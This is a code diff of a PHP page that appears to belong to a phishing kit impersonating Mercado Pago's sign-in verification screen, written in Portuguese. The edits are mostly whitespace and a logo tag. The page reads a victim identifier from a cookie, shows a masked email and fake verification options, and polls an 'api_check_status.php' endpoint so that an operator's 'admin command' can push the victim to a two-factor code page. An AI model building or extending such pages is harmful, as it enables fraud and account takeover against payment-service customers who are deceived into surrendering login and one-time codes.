@@ -19,7 +19,7 @@ if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
     // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
-    $redirect_target_2fa = 'dois_fatores.php'; 
+    $redirect_target_2fa = 'dois_fatores.php';
 }
 
 // 1. Verifica se o cookie 'identificador_cliente' existe
@@ -36,11 +36,11 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
         if ($resultado) {
             $identificador_puro = $resultado['identificador'];
-            
+
             // Formata o label e define o tipo
             if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
                 $identificador_label = 'E-mail: ' . htmlspecialchars($identificador_puro);
-                
+
                 // Lógica para mascarar E-MAIL no formato 'niv***@gmail.com'
                 $partes_email = explode('@', $identificador_puro);
                 if (count($partes_email) === 2) {
@@ -87,17 +87,17 @@ if (isset($_COOKIE['identificador_cliente'])) {
         .main-header { background-color: var(--andes-color-yellow-500); padding: 12px 24px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; box-sizing: border-box; display: flex; align-items: center; }
         .main-header img { height: 32px; }
         .main-content { padding: 24px; background-color: var(--andes-background-color-primary); flex-grow: 1; display: flex; flex-direction: column; }
-        
+
         .user-identifier-box { display: flex; align-items: center; gap: 12px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; width: fit-content; margin-bottom: 24px; }
         .icon-wrapper { width: 32px; height: 32px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; }
         .user-identifier-box .icon-wrapper svg { color: var(--andes-color-blue-500); }
         .identifier-text-block { display: flex; flex-direction: column; }
         .identifier-text-block .cpf-text { font-size: 14px; font-weight: 400; color: var(--andes-text-color-primary); }
         .identifier-text-block .change-account-link { font-size: 13px; color: var(--andes-text-color-link); text-decoration: none; margin-top: 2px; }
-        
+
         .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
         .main-title { font-size: 26px; font-weight: 400; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0 0 24px 0; }
-        
+
         .verification-card { box-sizing: border-box; }
         .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 0; text-decoration: none; color: inherit; }
         .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
@@ -109,7 +109,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
         .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
         .verification-option .chevron-icon { margin-left: auto; }
         .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
-        
+
         .final-separator { height: 1px; background-color: var(--andes-border-color-secondary); margin: 16px 0; }
         .cant-login-link { display: block; text-align: center; color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; padding: 16px 0; }
         .help-link { display: block; margin-top: auto; padding-top: 32px; text-align: center; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
@@ -118,7 +118,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 <body>
 
     <header class="main-header">
-        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.72/mercadopago/logo__small.png" alt="Mercado Pago">
+        <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     </header>
 
     <main class="main-content">
@@ -134,9 +134,9 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
         <span class="session-start-label">INÍCIO DE SESSÃO</span>
         <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
-        
+
         <div class="verification-card">
-            
+
             <a href="qrcode-mobile.php" class="verification-option">
                 <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M11.6871 0H8.32307V6.66142H9.98973V4.97848H11.6667V3.31313H9.98973V1.66536H11.6871V0Z"></path><path d="M11.6564 13.2617V14.9271H9.98973V16.6673H8.32307V11.6712H9.98973V13.2617H11.6564Z"></path><path d="M18.3333 18.3238H20V19.9892H18.3333V18.3238Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M10.0204 10.0097V11.6495H11.6769V13.3384H13.3026V18.3258H18.3026V16.6322H20V14.9668H18.3026V13.3298H13.3435V10.0077H11.6871V6.67894H10.0204V8.34431H6.64621V9.98419H4.95381V8.32483H1.62048V9.93896H0V11.6043H1.66667V9.99018H3.32836V11.6495H6.66169V10.0097H10.0204ZM14.9693 14.9951H16.6359V16.6605H14.9693V14.9951Z"></path><path d="M18.3795 9.99018H16.6769V11.6645H15.0102V9.99018H13.3795V8.32483H18.3795V9.99018Z"></path><path d="M18.3333 10.0077H20V13.3384H18.3333V10.0077Z"></path><path d="M10.0204 16.6693H11.6871V18.3346H13.3538V20H8.35384V18.3346H10.0204V16.6693Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0V6.67897H6.62046V0H0ZM4.9538 1.66536H1.66667V5.01361H4.9538V1.66536Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 13.321H6.62046V20H0V13.321ZM1.66667 14.9864H4.9538V18.3346H1.66667V14.9864Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M13.3591 0.00321877V6.68219H19.9795V0.00321877H13.3591ZM18.3129 1.66857H15.0257V5.01683H18.3129V1.66857Z"></path></svg></div>
                     <div class="text-content"><h3>Código QR</h3><p>Você vai escanear o código com a câmera do seu celular ou pelo app do Mercado Pago.</p></div>
@@ -160,7 +160,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
                     <div class="text-content"><h3>WhatsApp</h3><p>Vamos enviar um código para o telefone terminado em ****.</p></div>
                     <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                 </a>
-                
+
                 <a href="emailsms_mobile.php" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="14" viewBox="0 0 24 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.75 0.25H23.25V13.75H0.75V0.25ZM2.25 3.79417V12.25H21.75V3.79417L13.8601 8.30121C12.7074 8.95964 11.2926 8.95964 10.1399 8.30121L2.25 3.79417ZM2.25 2.06669L10.884 6.99874C11.5755 7.39379 12.4245 7.39379 13.116 6.99874L21.75 2.06669V1.75H2.25V2.06669Z"></path></svg></div>
                     <div class="text-content"><h3>E-mail</h3><p>Vamos enviar um código para <?php echo $email_mascarado; ?>.</p></div>
@@ -168,7 +168,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
                 </a>
 
                 <div class="final-separator"></div>
-                
+
                 <a href="https://www.mercadopago.com.br/account-recovery/landing-page?callback=https%3A%2F%2Fwww.mercadolivre.com%2Fjms%2Fmlb%2Flgz%2Fmsl%2Flogin%2FH4sIAAAAAAAEAy1P2w6CMAz9lz0bwHvg0R9ZCpTZuLFlKw5j_Hc79PGcnlvfynpDs-ZXQNUpXIOlgVjtVLDAk49O0ygHF4RKxPiHti8SiOCQMSbVvUuQwfGGYipRHBcUDSx815P1WaitSjhKGlexzWB1xv5JWK4T2FQcxgu4M4fU1XXOuXIYBxh9AOOrwbuqj7XIIhpKEoJl3lb22UlGYs0RhofqCif9oXwETH7-Tb-c2vNhf2zatjldzlf1-QLy-mEhAwEAAA%2Fsfa_removal%2Fcallback%3Fdps%3Darmor.26fffe04d42d6e334d245750e2be1f8563da232381384b96c08a7c0f0c67185eb2c7c4a614f5f3279aeea54552a2f88c5819aa3720ab720a18c5e3fe6690abbec651fb16a6a8816317b21d773163d163fcd3ded440ef946cd7c9957f4e3fcc32.fbb6183e18d9eba0900a8ec20ff7d912%26rbms%3D&on_hold_delay=24&recovery_type=CHANGE_EMAIL&transaction_id=aPsEtzPIkxgHrqeP2RIaFCOA5k7VZLGN" class="cant-login-link">Não consigo iniciar sessão</a>
             </div>
         </div>
@@ -202,7 +202,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
@@ -240,14 +240,14 @@ if (isset($_COOKIE['identificador_cliente'])) {
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
 
-                    console.log('Status atual:', data.status); 
+                    console.log('Status atual:', data.status);
 
                     if (data.status === 'redirecionar_para_2fa') {
                         // Para a verificação para não redirecionar em loop
                         clearInterval(statusInterval);
-                        
+
                         console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        
+
                         // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
